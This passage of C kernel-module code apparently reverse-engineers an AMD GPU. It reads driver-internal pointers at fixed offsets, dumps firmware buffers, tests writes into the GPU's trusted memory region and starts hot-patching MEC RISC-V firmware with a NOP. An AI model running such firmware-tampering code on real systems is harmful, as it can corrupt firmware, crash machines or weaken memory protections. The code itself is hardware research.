							pr_info("fw36: BO adev+0x%X: mc=0x%llX (VRAM+0x%llX) "
								"cpu=0x%llX size=0x%llX\n",
								off, v1, vram_off, v2, bo_size);
							pr_info("fw36:   [%08X %08X %08X %08X]\n",
								hdr[0], hdr[1], hdr[2], hdr[3]);

							/* Flag large BOs with non-zero data */
							if (bo_size >= 0x10000 &&
							    (hdr[0] != 0 || hdr[1] != 0)) {
								pr_info("fw36:   *** LARGE BO WITH DATA! ***\n");

								/* Check if data at PC offset has content */
								if (bo_size >= 0x129C + 16) {
									u32 pcd[4];
									if (copy_from_kernel_nofault(pcd,
										(void *)(unsigned long)(v2 + 0x129C), 16) == 0) {
										pr_info("fw36:   [PC off] %08X %08X %08X %08X\n",
											pcd[0], pcd[1], pcd[2], pcd[3]);
									}
								}
							}

							found++;
						}
					}
				}
			}
		}
		pr_info("fw36: Found %d BOs total\n", found);

		/* Also: scan adev->gfx area more carefully.
		 * adev->gfx struct starts around offset 0x17000-0x30000.
		 * adev->gfx.mec is within that range.
		 * Look for fields that contain mc_addr values near IC_BASE. */
		pr_info("fw36: --- MEC struct detailed dump ---\n");
		{
			int moff;
			u64 ic_lo = rr(regCP_CPC_IC_BASE_LO);
			/* Dump all non-zero qwords in gfx.mec area (0x3B800-0x3C000) */
			for (moff = 0x3B800; moff < 0x3C000; moff += 8) {
				u64 v = *(u64 *)((u8 *)adev + moff);
				if (v != 0 && v != 0xFFFFFFFFFFFFFFFFULL)
					pr_info("fw36:   adev+0x%X = 0x%016llX\n", moff, v);
			}
		}
	}

	/* ============================================================
	 * PHASE 15: TMR FIRMWARE ACCESS — Read/Write via discovered kptrs
	 *
	 * Key discoveries from Phase 14:
	 *   adev+0x3B920 = 0xFFFFCF9F3F7A3000 (kptr, possible TMR mapping)
	 *   adev+0x3B928 = 0x00000097FF7A3000 (TMR MC address)
	 *   adev+0x3BA98 = BO ptr for TMR base (mc=0x97E0000000)
	 *   adev+0x3B958 = BO ptr (mc=0x7FFF00700000, GART BO)
	 *   adev+0x3B900 = 0xFFFFCF8704CED000 (another kptr)
	 *   adev+0x3B908 = 0x7FFF00C00000 (another GART mc_addr)
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 15: TMR/GART FIRMWARE ACCESS ==========\n");
	{
		int i;

		/* Test all interesting kptr+mc_addr pairs from the MEC struct */
		struct { int off; const char *name; } pairs[] = {
			{ 0x3B888, "gfx.mec field1" },
			{ 0x3B8B8, "gfx.mec field2" },
			{ 0x3B8D0, "gfx.mec field3" },
			{ 0x3B900, "gfx.mec fw_gart1" },
			{ 0x3B920, "gfx.mec TMR_map" },
			{ 0x3B940, "gfx.mec field5" },
			{ 0x3B958, "gfx.mec fw_gart2" },
			{ 0x3BA98, "gfx.mec TMR_base_BO" },
		};

		for (i = 0; i < 8; i++) {
			u64 ptr_val = *(u64 *)((u8 *)adev + pairs[i].off);
			u64 next_val = *(u64 *)((u8 *)adev + pairs[i].off + 8);
			u64 next2 = *(u64 *)((u8 *)adev + pairs[i].off + 16);

			pr_info("fw36: %s (adev+0x%X):\n", pairs[i].name, pairs[i].off);
			pr_info("fw36:   [+0] 0x%llX  [+8] 0x%llX  [+16] 0x%llX\n",
				ptr_val, next_val, next2);

			/* If ptr_val is a kernel pointer, try reading from it */
			if ((ptr_val >> 48) == 0xFFFF && ptr_val != 0xFFFFFFFFFFFFFFFFULL) {
				u32 data[16];
				if (copy_from_kernel_nofault(data, (void *)(unsigned long)ptr_val, 64) == 0) {
					pr_info("fw36:   data[0..15]: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
						data[0], data[1], data[2], data[3],
						data[4], data[5], data[6], data[7]);
					pr_info("fw36:              : %08X %08X %08X %08X | %08X %08X %08X %08X\n",
						data[8], data[9], data[10], data[11],
						data[12], data[13], data[14], data[15]);

					/* Check for RISC-V opcodes */
					if ((data[0] & 0x7F) == 0x17 || (data[0] & 0x7F) == 0x37 ||
					    (data[0] & 0x7F) == 0x6F || (data[0] & 0x7F) == 0x13 ||
					    (data[0] & 0x7F) == 0x67) {
						pr_info("fw36:   *** POSSIBLE RISC-V CODE! ***\n");
					}
				} else {
					pr_info("fw36:   UNREADABLE\n");
				}

				/* If this could be a BO pointer, probe deeper */
				if (next_val > 0x7FFF00000000ULL || next_val > 0x80000000000ULL) {
					/* Try to find kptr inside the BO struct */
					int koff;
					for (koff = 0x80; koff <= 0x180; koff += 8) {
						u64 kv;
						if (copy_from_kernel_nofault(&kv,
							(void *)((unsigned long)ptr_val + koff), 8) == 0 &&
						    (kv >> 48) == 0xFFFF && kv != ptr_val &&
						    kv != 0xFFFFFFFFFFFFFFFFULL) {
							u32 test[4];
							if (copy_from_kernel_nofault(test,
								(void *)(unsigned long)kv, 16) == 0 &&
							    (test[0] != 0 || test[1] != 0)) {
								pr_info("fw36:   BO+0x%X kptr=0x%llX: %08X %08X %08X %08X\n",
									koff, kv, test[0], test[1], test[2], test[3]);
							}
						}
					}
				}
			}

			/* Special case: next_val or next2 might be a cpu_addr */
			if ((next2 >> 48) == 0xFFFF && next2 != 0xFFFFFFFFFFFFFFFFULL) {
				u32 data[8];
				if (copy_from_kernel_nofault(data, (void *)(unsigned long)next2, 32) == 0) {
					pr_info("fw36:   via next2 kptr: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
						data[0], data[1], data[2], data[3],
						data[4], data[5], data[6], data[7]);
				}
			}
		}

		/* Direct TMR kptr access */
		pr_info("fw36: --- Direct TMR kptr probe ---\n");
		{
			u64 tmr_kptr = *(u64 *)((u8 *)adev + 0x3B920);
			u64 tmr_mc = *(u64 *)((u8 *)adev + 0x3B928);

			pr_info("fw36: TMR kptr = 0x%llX, TMR mc = 0x%llX\n",
				tmr_kptr, tmr_mc);

			if ((tmr_kptr >> 48) == 0xFFFF) {
				u32 data[32];
				int j;

				/* Try reading at various offsets into TMR */
				u64 offsets[] = { 0, 0x1000, 0x2000, 0x4000, 0x8000,
						  0x10000, 0x20000, 0x40000, 0x80000, 0x100000 };
				for (j = 0; j < 10; j++) {
					if (copy_from_kernel_nofault(data,
						(void *)(unsigned long)(tmr_kptr + offsets[j]), 32) == 0) {
						if (data[0] != 0 || data[1] != 0 || data[2] != 0 || data[3] != 0) {
							pr_info("fw36: TMR+0x%llX: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
								offsets[j],
								data[0], data[1], data[2], data[3],
								data[4], data[5], data[6], data[7]);

							/* Check for RISC-V */
							if ((data[0] & 0x7F) == 0x17 || (data[0] & 0x7F) == 0x6F ||
							    data[0] == 0x00000297) {
								pr_info("fw36: *** RS64 FIRMWARE CANDIDATE AT TMR+0x%llX! ***\n",
									offsets[j]);
							}
						}
					} else {
						if (j == 0)
							pr_info("fw36: TMR kptr UNREADABLE at offset 0x%llX\n",
								offsets[j]);
						break;
					}
				}

				/* If TMR is readable, check at the firmware's MC offset.
				 * FW BO mc_addr = 0x80007EE000.
				 * TMR mc_addr = 0x97FF7A3000.
				 * IC_BASE = 0x20681D4000 (GPU VA, can't use directly).
				 * The firmware in TMR might be at a specific offset from TMR start.
				 * TMR base = 0x97E0000000, so TMR offset of our ptr = 0x1F7A3000.
				 * The MEC firmware blob in TMR: we need to search for it. */
			}
		}

		/* Check the GART BO at 0x3B958 — mc=0x7FFF00700000 */
		pr_info("fw36: --- GART BO probe (adev+0x3B958) ---\n");
		{
			u64 gart_bo = *(u64 *)((u8 *)adev + 0x3B958);
			u64 gart_mc = *(u64 *)((u8 *)adev + 0x3B960);
			u64 gart_cpu = *(u64 *)((u8 *)adev + 0x3B968);

			pr_info("fw36: GART BO: obj=0x%llX mc=0x%llX cpu=0x%llX\n",
				gart_bo, gart_mc, gart_cpu);

			if ((gart_cpu >> 48) == 0xFFFF) {
				u32 data[32];
				int j;
				/* Dump first 128 bytes */
				if (copy_from_kernel_nofault(data,
					(void *)(unsigned long)gart_cpu, 128) == 0) {
					for (j = 0; j < 32; j += 4)
						pr_info("fw36:   GART[%3d] %08X %08X %08X %08X\n",
							j, data[j], data[j+1], data[j+2], data[j+3]);

					/* Check for RISC-V code */
					if ((data[0] & 0x7F) == 0x17 || (data[0] & 0x7F) == 0x6F ||
					    data[0] == 0x00000297)
						pr_info("fw36: *** RS64 CODE IN GART BO! ***\n");
				}
			}
		}

		/* Check 0x3B900 — mc=0x7FFF00C00000 */
		pr_info("fw36: --- GART BO probe (adev+0x3B900) ---\n");
		{
			u64 cpu = *(u64 *)((u8 *)adev + 0x3B900);
			u64 mc = *(u64 *)((u8 *)adev + 0x3B908);

			pr_info("fw36: cpu=0x%llX mc=0x%llX\n", cpu, mc);

			if ((cpu >> 48) == 0xFFFF) {
				u32 data[32];
				int j;
				if (copy_from_kernel_nofault(data,
					(void *)(unsigned long)cpu, 128) == 0) {
					for (j = 0; j < 32; j += 4)
						pr_info("fw36:   [%3d] %08X %08X %08X %08X\n",
							j, data[j], data[j+1], data[j+2], data[j+3]);
				}
			}
		}
	}

	/* ============================================================
	 * PHASE 16: TMR DEEP PROBE — size, writability, RS64 firmware search
	 *
	 * TMR kptr at adev+0x3B920 IS READABLE. Now:
	 * 1) Determine mapped size (probe pages until fault)
	 * 2) Scan all pages for RS64 RISC-V opcodes
	 * 3) Test writability (canary write + restore)
	 * 4) Read full descriptor table at TMR+0x0
	 * 5) Look for MEC firmware code pattern
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 16: TMR DEEP PROBE ==========\n");
	{
		u64 tmr_kptr = *(u64 *)((u8 *)adev + 0x3B920);
		u64 tmr_mc   = *(u64 *)((u8 *)adev + 0x3B928);
		u64 tmr_base_mc = *(u64 *)((u8 *)adev + 0x3BAA0);
		u32 data[8];
		u64 mapped_size = 0;
		u64 off;
		int rv_pages = 0;

		pr_info("fw36: TMR kptr=0x%llX mc=0x%llX base_mc=0x%llX\n",
			tmr_kptr, tmr_mc, tmr_base_mc);
		pr_info("fw36: TMR offset from base = 0x%llX\n",
			tmr_mc - tmr_base_mc);

		if ((tmr_kptr >> 48) != 0xFFFF) {
			pr_info("fw36: TMR kptr invalid, skipping\n");
			goto phase16_done;
		}

		/* 1) Probe TMR mapping size — read 4 bytes per page until fault */
		pr_info("fw36: --- Probing TMR mapped size ---\n");
		for (off = 0; off < 0x2000000ULL; off += 0x1000) {
			u32 probe;
			if (copy_from_kernel_nofault(&probe,
				(void *)(unsigned long)(tmr_kptr + off), 4) != 0)
				break;
			mapped_size = off + 0x1000;
		}
		pr_info("fw36: TMR mapped size = 0x%llX (%llu KB)\n",
			mapped_size, mapped_size >> 10);

		/* 2) Read full descriptor table at TMR+0x0 (first 256 bytes) */
		pr_info("fw36: --- TMR descriptor table ---\n");
		{
			u32 desc[64];
			if (copy_from_kernel_nofault(desc,
				(void *)(unsigned long)tmr_kptr, 256) == 0) {
				int d;
				for (d = 0; d < 64; d += 4)
					pr_info("fw36: TMR[%3d]: %08X %08X %08X %08X\n",
						d*4, desc[d], desc[d+1], desc[d+2], desc[d+3]);
			}
		}

		/* 3) Scan all pages for RS64 RISC-V opcode density */
		pr_info("fw36: --- RS64 opcode scan (every 4KB page) ---\n");
		{
			u64 best_off = 0;
			int best_rv_count = 0;

			for (off = 0; off < mapped_size; off += 0x1000) {
				u32 page[256]; /* 1024 bytes per check */
				int rv_count = 0;
				int i;

				if (copy_from_kernel_nofault(page,
					(void *)(unsigned long)(tmr_kptr + off), 1024) != 0)
					break;

				/* Count RISC-V opcode patterns in low 7 bits */
				for (i = 0; i < 256; i++) {
					u32 op = page[i] & 0x7F;
					/* Standard RV32I/M opcodes */
					if (op == 0x13 || /* OP-IMM (ADDI, etc) */
					    op == 0x33 || /* OP (ADD, SUB, etc) */
					    op == 0x37 || /* LUI */
					    op == 0x17 || /* AUIPC */
					    op == 0x6F || /* JAL */
					    op == 0x67 || /* JALR */
					    op == 0x63 || /* BRANCH */
					    op == 0x03 || /* LOAD */
					    op == 0x23 || /* STORE */
					    op == 0x73 || /* SYSTEM (CSR) */
					    op == 0x0F) { /* FENCE */
						rv_count++;
					}
				}

				if (rv_count > best_rv_count) {
					best_rv_count = rv_count;
					best_off = off;
				}

				/* Report pages with >30% RV opcode density */
				if (rv_count > 76) { /* 76/256 ≈ 30% */
					pr_info("fw36: TMR+0x%llX: %d/256 RV opcodes (%.1d%%)\n",
						off, rv_count, (rv_count * 100) / 256);
					rv_pages++;
					if (rv_pages <= 5) {
						/* Dump first 32 bytes of this page */
						pr_info("fw36:   %08X %08X %08X %08X | %08X %08X %08X %08X\n",
							page[0], page[1], page[2], page[3],
							page[4], page[5], page[6], page[7]);
					}
				}
			}

			pr_info("fw36: Best RV opcode density: %d/256 at TMR+0x%llX\n",
				best_rv_count, best_off);
			pr_info("fw36: Pages with >30%% RV opcodes: %d / %llu total\n",
				rv_pages, mapped_size >> 12);

			/* Dump the best candidate page */
			if (best_rv_count > 20) {
				u32 best_page[8];
				if (copy_from_kernel_nofault(best_page,
					(void *)(unsigned long)(tmr_kptr + best_off), 32) == 0) {
					pr_info("fw36: Best page TMR+0x%llX: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
						best_off,
						best_page[0], best_page[1], best_page[2], best_page[3],
						best_page[4], best_page[5], best_page[6], best_page[7]);
				}
			}
		}

		/* 4) TMR WRITE TEST — canary write + verify + restore */
		pr_info("fw36: --- TMR WRITE TEST ---\n");
		{
			/* Use TMR+0x1000 (sparse area, had only 0x00000004) */
			u64 test_off = 0x1000;
			u32 orig_val, canary = 0xCAFE1337;
			u32 readback;

			if (copy_from_kernel_nofault(&orig_val,
				(void *)(unsigned long)(tmr_kptr + test_off + 4), 4) == 0) {
				pr_info("fw36: TMR+0x%llX+4 orig = 0x%08X\n",
					test_off, orig_val);

				/* Write canary */
				if (copy_to_kernel_nofault(
					(void *)(unsigned long)(tmr_kptr + test_off + 4),
					&canary, 4) == 0) {
					pr_info("fw36: Canary write returned SUCCESS\n");

					udelay(100);

					/* Read back */
					if (copy_from_kernel_nofault(&readback,
						(void *)(unsigned long)(tmr_kptr + test_off + 4), 4) == 0) {
						pr_info("fw36: TMR+0x%llX+4 readback = 0x%08X %s\n",
							test_off, readback,
							readback == canary ?
							"*** TMR IS WRITABLE! ***" :
							(readback == orig_val ?
							"WRITE SILENTLY DROPPED" :
							"UNEXPECTED VALUE"));

						if (readback == canary) {
							/* RESTORE original */
							copy_to_kernel_nofault(
								(void *)(unsigned long)(tmr_kptr + test_off + 4),
								&orig_val, 4);
							udelay(100);
							copy_from_kernel_nofault(&readback,
								(void *)(unsigned long)(tmr_kptr + test_off + 4), 4);
							pr_info("fw36: Restored TMR+0x%llX+4 = 0x%08X %s\n",
								test_off, readback,
								readback == orig_val ? "OK" : "FAIL");
						}
					}
				} else {
					pr_info("fw36: Canary write FAILED (copy_to_kernel_nofault error)\n");
				}
			}
		}

		/* 5) Check if TMR+0x0 descriptor points us to firmware code.
		 * TMR+0x0 = 0x007ED000 — this is a VRAM offset (FB_BASE + 0x7ED000)
		 * TMR+0xC = 0x007EE000 — another VRAM offset (the trampoline BO)
		 * These are the GART-mapped firmware stubs.
		 * The ACTUAL MEC firmware code may be further into TMR.
		 * Also check adev+0x3B940 field5 — it had 0xFF7A1000 0x00000097
		 * which is (0x97FF7A1000) = TMR mc - 0x2000. Could be fw_mc_addr. */
		pr_info("fw36: --- TMR firmware offset search ---\n");
		{
			u64 field5_val = *(u64 *)((u8 *)adev + 0x3B978);
			u64 field5_val2 = *(u64 *)((u8 *)adev + 0x3B980);
			pr_info("fw36: adev+0x3B978 = 0x%llX, adev+0x3B980 = 0x%llX\n",
				field5_val, field5_val2);

			/* The tmr_mc for this mapping is 0x97FF7A3000.
			 * field5 had bytes FF7A1000 00000097 = 0x97FF7A1000
			 * That's TMR_kptr - 0x2000 in MC address space.
			 * So TMR kptr maps starting at mc 0x97FF7A3000 and the code
			 * might actually start 0x2000 bytes BEFORE our mapping...
			 * But we can't access before our mapping start.
			 *
			 * Try reading from the TMR base BO instead. */
			{
				u64 tmr_base_bo = *(u64 *)((u8 *)adev + 0x3BA98);
				u64 tmr_base_bo_mc = *(u64 *)((u8 *)adev + 0x3BAA0);
				pr_info("fw36: TMR base BO: obj=0x%llX mc=0x%llX\n",
					tmr_base_bo, tmr_base_bo_mc);

				/* The TMR base BO represents the full TMR allocation.
				 * Try to find a cpu_addr mapping for it. */
				if ((tmr_base_bo >> 48) == 0xFFFF) {
					/* It's a kernel pointer (struct amdgpu_bo*) */
					u64 cpu_addr;
					int boff;
					pr_info("fw36: TMR base BO struct dump:\n");
					for (boff = 0; boff < 0x200; boff += 0x20) {
						u64 v[4];
						if (copy_from_kernel_nofault(v,
							(void *)(unsigned long)(tmr_base_bo + boff), 32) == 0) {
							pr_info("fw36:   BO+0x%X: %016llX %016llX %016llX %016llX\n",
								boff, v[0], v[1], v[2], v[3]);
						}
					}
				}
			}
		}

		/* 6) Search for the MEC firmware by looking for the AUIPC+JALR
		 * pattern that RS64 uses for function calls, or the init sequence.
		 * RS64 MEC init typically starts with:
		 *   AUIPC ra, <offset>   (opcode 0x17, rd=ra=x1)
		 *   JALR  ra, ra, <imm>  (opcode 0x67)
		 * The first instruction at PC=0x800 (PRGRM_CNTR_START) is the entry.
		 * Byte offset = 0x800 * 4 = 0x2000.
		 * Check TMR at that offset with care — MEC might address in 4-byte
		 * instruction words, or in bytes. */
		pr_info("fw36: --- MEC entry point search ---\n");
		{
			/* PC=0x800, if word-addressed: byte offset 0x2000
			 * PC=0x800, if byte-addressed: offset 0x800
			 * PC=0x4A7, if word-addressed: byte offset 0x129C
			 * PC=0x4A7, if byte-addressed: offset 0x4A7 */
			u64 candidates[] = {0x800, 0x2000, 0x129C, 0x4A7,
					    0x0, 0x1000, 0x3000, 0x4000};
			int c;
			for (c = 0; c < 8; c++) {
				u32 instrs[8];
				if (candidates[c] >= mapped_size)
					continue;
				if (copy_from_kernel_nofault(instrs,
					(void *)(unsigned long)(tmr_kptr + candidates[c]), 32) == 0) {
					int rv = 0, i;
					for (i = 0; i < 8; i++) {
						u32 op = instrs[i] & 0x7F;
						if (op == 0x13 || op == 0x33 || op == 0x37 ||
						    op == 0x17 || op == 0x6F || op == 0x67 ||
						    op == 0x63 || op == 0x03 || op == 0x23 ||
						    op == 0x73)
							rv++;
					}
					pr_info("fw36: TMR+0x%llX: %08X %08X %08X %08X | %08X %08X %08X %08X [%d/8 RV]\n",
						candidates[c],
						instrs[0], instrs[1], instrs[2], instrs[3],
						instrs[4], instrs[5], instrs[6], instrs[7],
						rv);
				}
			}
		}

		/* 7) Also try reading from the SECOND TMR-range mapping.
		 * adev+0x3B940 field5 had a kernel_function ptr 0xFFFFFFFFC1E11EE0
		 * and values 0xFF7A1000 0x00000097 at offset 0x3B978.
		 * These reconstruct to mc 0x97FF7A1000 = our TMR mc - 0x2000.
		 * That might be the ACTUAL fw start (TMR+0 is headers, -0x2000 is code).
		 * We can try reading via MM_INDEX at MC address 0x97FF7A1000. */
		pr_info("fw36: --- VRAM read at TMR mc-0x2000 ---\n");
		{
			u64 fw_mc = tmr_mc - 0x2000;
			u32 d[8];
			int i;
			for (i = 0; i < 8; i++)
				d[i] = vram_read32(fw_mc + i * 4);
			pr_info("fw36: MC 0x%llX: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
				fw_mc,
				d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);

			/* And at TMR mc itself */
			for (i = 0; i < 8; i++)
				d[i] = vram_read32(tmr_mc + i * 4);
			pr_info("fw36: MC 0x%llX: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
				tmr_mc,
				d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);

			/* Read at IC_BASE-derived MC address.
			 * IC_BASE = 0x20681D4000. FB_BASE = 0x8000000000.
			 * IC_BASE is a GPU VA, not MC. But try:
			 * MC = IC_BASE's page table target. We can't walk it.
			 * But the FW BOs told us mc=0x80007EE000 for the trampoline.
			 * 0x80007EE000 - 0x8000000000 = 0x7EE000 VRAM offset.
			 * TMR[0x0] = 0x007ED000, TMR[0xC] = 0x007EE000.
			 * The JAL in the trampoline at 0x7EE000 jumps somewhere.
			 * Let's read the trampoline via VRAM and decode the JAL target. */
			pr_info("fw36: --- Trampoline JAL decode ---\n");
			{
				u32 jal_instr = vram_read32(0x80007EE000ULL);
				pr_info("fw36: Trampoline[0] = 0x%08X\n", jal_instr);

				if ((jal_instr & 0x7F) == 0x6F) {
					/* JAL: imm[20|10:1|11|19:12] rd
					 * Decode J-immediate */
					s32 imm;
					u64 target_pc;
					imm = ((jal_instr >> 31) ? 0xFFF00000 : 0) |
					      (jal_instr & 0x000FF000) |
					      ((jal_instr >> 9) & 0x800) |
					      ((jal_instr >> 20) & 0x7FE);
					/* The JAL target is PC + imm.
					 * Trampoline is at the start of the fw text section.
					 * If the trampoline is at PC=0x0 in MEC address space,
					 * then target = imm.
					 * If at PC=0x800, target = 0x800 + imm. */
					pr_info("fw36: JAL imm = 0x%X (%d)\n", imm, imm);
					target_pc = imm; /* relative to trampoline */
					pr_info("fw36: JAL target (from trampoline base) = 0x%llX\n",
						target_pc);

					/* Read instructions at the JAL target
					 * relative to VRAM 0x7EE000 base */
					if (imm > 0 && imm < 0x100000) {
						u32 tgt[8];
						u64 tgt_vram = 0x80007EE000ULL + imm;
						for (i = 0; i < 8; i++)
							tgt[i] = vram_read32(tgt_vram + i * 4);
						pr_info("fw36: JAL target VRAM+0x%llX: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
							0x7EE000ULL + imm,
							tgt[0], tgt[1], tgt[2], tgt[3],
							tgt[4], tgt[5], tgt[6], tgt[7]);

						/* Count RV opcodes at target */
						{
							int rv = 0;
							for (i = 0; i < 8; i++) {
								u32 op = tgt[i] & 0x7F;
								if (op == 0x13 || op == 0x33 || op == 0x37 ||
								    op == 0x17 || op == 0x6F || op == 0x67 ||
								    op == 0x63 || op == 0x03 || op == 0x23 ||
								    op == 0x73)
									rv++;
							}
							pr_info("fw36: Target RV opcodes: %d/8\n", rv);
						}
					}
				} else {
					pr_info("fw36: Trampoline[0] is NOT a JAL (opcode 0x%02X)\n",
						jal_instr & 0x7F);
				}

				/* Also read next few instructions at trampoline */
				{
					u32 tramp[16];
					for (i = 0; i < 16; i++)
						tramp[i] = vram_read32(0x80007EE000ULL + i * 4);
					pr_info("fw36: Trampoline dump:\n");
					pr_info("fw36:   %08X %08X %08X %08X | %08X %08X %08X %08X\n",
						tramp[0], tramp[1], tramp[2], tramp[3],
						tramp[4], tramp[5], tramp[6], tramp[7]);
					pr_info("fw36:   %08X %08X %08X %08X | %08X %08X %08X %08X\n",
						tramp[8], tramp[9], tramp[10], tramp[11],
						tramp[12], tramp[13], tramp[14], tramp[15]);
				}

				/* Read at 0x7ED000 too (the first descriptor entry) */
				{
					u32 ed[8];
					for (i = 0; i < 8; i++)
						ed[i] = vram_read32(0x80007ED000ULL + i * 4);
					pr_info("fw36: VRAM+0x7ED000: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
						ed[0], ed[1], ed[2], ed[3],
						ed[4], ed[5], ed[6], ed[7]);
				}
			}
		}
	}
phase16_done:

	/* ============================================================
	 * PHASE 17: MEC IDLE LOOP HUNT + TMR HOT-PATCH
	 *
	 * TMR is 8.4MB, writable, and contains RS64 code at +0x367000.
	 * MEC PC is stuck at 0x4A7. We need to find where PC=0x4A7 maps
	 * in the TMR and attempt a hot-patch.
	 *
	 * Strategy:
	 * a) Scan TMR for idle loop patterns (branch-to-self, WFI, FENCE)
	 * b) Search for code that matches a wait/poll loop
	 * c) Try broader opcode detection (AMD custom RS64 extensions)
	 * d) Attempt hot-patch at TMR+0x367000 (known code) + IC invalidate
	 * e) Check if MEC behavior changes
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 17: TMR HOT-PATCH ==========\n");
	{
		u64 tmr_kptr = *(u64 *)((u8 *)adev + 0x3B920);
		u64 tmr_mc   = *(u64 *)((u8 *)adev + 0x3B928);
		u64 mapped_size = 0x85D000ULL; /* from Phase 16 */
		u64 off;

		if ((tmr_kptr >> 48) != 0xFFFF) {
			pr_info("fw36: TMR kptr invalid\n");
			goto phase17_done;
		}

		/* a) Scan for branch-to-self patterns (idle loops) */
		pr_info("fw36: --- Scanning for idle loop patterns ---\n");
		{
			int idle_found = 0;
			for (off = 0; off < mapped_size && idle_found < 10; off += 4) {
				u32 instr;
				if ((off & 0xFFF) == 0) {
					/* Page boundary — verify still readable */
					if (copy_from_kernel_nofault(&instr,
						(void *)(unsigned long)(tmr_kptr + off), 4) != 0)
						break;
				} else {
					copy_from_kernel_nofault(&instr,
						(void *)(unsigned long)(tmr_kptr + off), 4);
				}

				/* Branch-to-self: BEQ x0, x0, 0 = 0x00000063
				 * JAL x0, 0 = 0x0000006F
				 * J 0 (alias) = 0x0000006F
				 * FENCE = 0x0000000F or 0x0FF0000F
				 * WFI = 0x10500073
				 * Custom AMD wait: unknown encoding */
				if (instr == 0x00000063 || /* BEQ x0,x0,0 */
				    instr == 0x0000006F || /* JAL x0,0 (J 0) */
				    instr == 0x10500073 || /* WFI */
				    instr == 0x0100006F || /* JAL x0,+16 */
				    (instr & 0x01FFF07F) == 0x00000063) { /* Any BEQ with 0 offset */
					pr_info("fw36: IDLE candidate at TMR+0x%llX: 0x%08X\n",
						off, instr);
					idle_found++;
					/* Dump context around it */
					{
						u32 ctx[8];
						u64 ctx_off = (off >= 16) ? off - 16 : 0;
						if (copy_from_kernel_nofault(ctx,
							(void *)(unsigned long)(tmr_kptr + ctx_off), 32) == 0) {
							pr_info("fw36:   context: %08X %08X %08X %08X | %08X %08X %08X %08X\n",
								ctx[0], ctx[1], ctx[2], ctx[3],
								ctx[4], ctx[5], ctx[6], ctx[7]);
						}
					}
				}
			}
			pr_info("fw36: Found %d idle loop candidates in %llu bytes\n",
				idle_found, off);
		}

		/* b) Deeper scan at TMR+0x367000 area — decode more instructions */
		pr_info("fw36: --- RS64 code analysis at TMR+0x367000 ---\n");
		{
			u32 code[128]; /* 512 bytes = 128 instructions */
			if (copy_from_kernel_nofault(code,
				(void *)(unsigned long)(tmr_kptr + 0x367000), 512) == 0) {
				int i;
				pr_info("fw36: First 64 instructions at TMR+0x367000:\n");
				for (i = 0; i < 64; i += 4) {
					pr_info("fw36:   [%3d] %08X %08X %08X %08X\n",
						i, code[i], code[i+1], code[i+2], code[i+3]);
				}

				/* Analyze instruction patterns */
				{
					int sys_count = 0, load_count = 0, store_count = 0;
					int branch_count = 0, custom_count = 0;
					for (i = 0; i < 128; i++) {
						u32 op = code[i] & 0x7F;
						if (op == 0x73) sys_count++;
						else if (op == 0x03) load_count++;
						else if (op == 0x23) store_count++;
						else if (op == 0x63) branch_count++;
						else if (op == 0x13 || op == 0x33) /* ALU */ ;
						else custom_count++;
					}
					pr_info("fw36: Instruction mix: SYS=%d LOAD=%d STORE=%d BRANCH=%d custom=%d\n",
						sys_count, load_count, store_count, branch_count, custom_count);
				}
			}
		}

		/* c) Look for the code section start — search for typical
		 * firmware prologue: LUI + ADDI stack setup, AUIPC, etc.
		 * Also search for the specific value 0x4A7 or 0x800 in code
		 * (these are PC values that might appear as branch targets) */
		pr_info("fw36: --- Firmware prologue search ---\n");
		{
			int found = 0;
			for (off = 0; off < mapped_size && found < 10; off += 0x1000) {
				u32 page[4];
				if (copy_from_kernel_nofault(page,
					(void *)(unsigned long)(tmr_kptr + off), 16) != 0)
					break;

				/* Look for AUIPC (0x17) or LUI (0x37) at page start */
				if ((page[0] & 0x7F) == 0x17 || /* AUIPC */
				    (page[0] & 0x7F) == 0x37) { /* LUI */
					u32 next_op = page[1] & 0x7F;
					/* AUIPC followed by JALR is a function call */
					if (next_op == 0x67 || next_op == 0x13 || next_op == 0x23) {
						pr_info("fw36: FW prologue candidate at TMR+0x%llX: %08X %08X %08X %08X\n",
							off, page[0], page[1], page[2], page[3]);
						found++;
					}
				}
			}
		}

		/* d) HOT-PATCH ATTEMPT at known RS64 code location.
		 * Write a different CSR instruction at TMR+0x367000,
		 * then invalidate IC, and check MEC behavior.
		 *
		 * We'll write to a CSR that we can READ via MMIO.
		 * MEC scratch registers: regCP_MEC_SCRATCH_1..n
		 * If we replace the CSR init code with a write to
		 * a scratch register, and MEC re-executes that code
		 * after IC invalidation, we'll see the scratch change.
		 *
		 * But first: the code at TMR+0x367000 may NOT be in the
		 * active execution path (it's an init sequence). We need
		 * code that MEC executes repeatedly — the idle loop.
		 *
		 * Alternative: patch the idle loop to write a sentinel
		 * to a scratch register every iteration. But we haven't
		 * found the idle loop yet.
		 *
		 * Pragmatic approach: just NOP out one instruction at
		 * TMR+0x367000, invalidate IC, and see if the replacement
		 * sticks after MEC re-fetches. */
		pr_info("fw36: --- TMR hot-patch test ---\n");
		{
			u32 orig_instr, nop_instr = 0x00000013; /* ADDI x0, x0, 0 = NOP */
			u32 readback;
			u64 patch_off = 0x367000;

			copy_from_kernel_nofault(&orig_instr,
				(void *)(unsigned long)(tmr_kptr + patch_off), 4);
			pr_info("fw36: Original at TMR+0x%llX: 0x%08X\n",
				patch_off, orig_instr);

			/* Write NOP */
			copy_to_kernel_nofault(
				(void *)(unsigned long)(tmr_kptr + patch_off),
				&nop_instr, 4);
			udelay(100);

			/* Verify write */
			copy_from_kernel_nofault(&readback,
				(void *)(unsigned long)(tmr_kptr + patch_off), 4);
			pr_info("fw36: After NOP write: 0x%08X %s\n",
				readback,
				readback == nop_instr ?
				"*** WRITE CONFIRMED ***" : "FAILED");

			if (readback == nop_instr) {
				/* IC invalidation sequence */
				pr_info("fw36: Invalidating IC...\n");

				/* Method 1: RS64_CNTL IC invalidate (bit 4) */
				{
					u32 rs64_cntl = rr(regCP_MEC_RS64_CNTL);
